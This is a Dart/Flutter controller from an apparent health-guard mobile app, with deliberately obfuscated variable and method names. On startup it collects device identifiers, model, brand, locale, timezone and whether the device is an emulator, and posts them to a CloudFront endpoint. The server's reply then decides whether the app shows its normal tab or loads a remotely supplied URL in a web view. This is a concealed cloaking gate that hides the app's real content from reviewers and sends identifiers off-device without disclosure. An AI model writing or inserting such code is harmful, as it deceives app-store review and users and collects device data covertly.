import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class HealthGuardTidyLogic extends GetxController {

  var whzufgvoqc = RxBool(false);
  var ivhtwqy = RxBool(true);
  var kgqlp = RxString("");
  var hsxomkvl = RxBool(false);
  var vocugaj = RxBool(true);
  final yntufbraih = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    kwach();
  }


  Future<void> kwach() async {
    hsxomkvl.value = true;
    vocugaj.value = true;
    ivhtwqy.value = false;

    yntufbraih.post("https://ddwhox6t4lfon.cloudfront.net/lyq5n",data: await vosjpgu()).then((value) {
      var mzulifbc = value.data["mzulifbc"] as String;
      var efjbaw = value.data["efjbaw"] as bool;
      if (efjbaw) {
        kgqlp.value = mzulifbc;
        jewu();
      } else {
        guhxqt();
      }
    }).catchError((e) {
      ivhtwqy.value = true;
      vocugaj.value = true;
      hsxomkvl.value = false;
    });
  }

  Future<Map<String, dynamic>> vosjpgu() async {
    final DeviceInfoPlugin otshjx = DeviceInfoPlugin();
    PackageInfo dlvsy_tlpow = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var bjudyvg = Platform.localeName;
    var YLETNAch = currentTimeZone;

    var tWOk = dlvsy_tlpow.packageName;
    var YyRK = dlvsy_tlpow.version;
    var BMhLkoxt = dlvsy_tlpow.buildNumber;

    var ymtkGfsa = dlvsy_tlpow.appName;
    var TMxdbzBj = "";
    var XPfDnmKq  = "";
    var GbSX = "";
    var oakdutes = "";
    var tkic = "";
    var oaklue = "";


    var STQNhRso = "";
    var cLdrMBp = false;

    if (GetPlatform.isAndroid) {
      STQNhRso = "android";
      var bhxciqr = await otshjx.androidInfo;

      GbSX = bhxciqr.brand;

      TMxdbzBj  = bhxciqr.model;
      XPfDnmKq = bhxciqr.id;

      cLdrMBp = bhxciqr.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      STQNhRso = "ios";
      var fangrmxosk = await otshjx.iosInfo;
      GbSX = fangrmxosk.name;
      TMxdbzBj = fangrmxosk.model;

      XPfDnmKq = fangrmxosk.identifierForVendor ?? "";
      cLdrMBp  = fangrmxosk.isPhysicalDevice;
    }
    var res = {
      "ymtkGfsa": ymtkGfsa,
      "YyRK": YyRK,
      "bjudyvg": bjudyvg,
      "tWOk": tWOk,
      "TMxdbzBj": TMxdbzBj,
      "YLETNAch": YLETNAch,
      "GbSX": GbSX,
      "XPfDnmKq": XPfDnmKq,
      "STQNhRso": STQNhRso,
      "BMhLkoxt": BMhLkoxt,
      "cLdrMBp": cLdrMBp,
      "oakdutes" : oakdutes,
      "tkic" : tkic,
      "oaklue" : oaklue,

    };
    return res;
  }

  Future<void> guhxqt() async {
    Get.offNamed("/health_guard_tab");
  }

  Future<void> jewu() async {
    Get.offNamed("/health_guard_watch");
  }

}
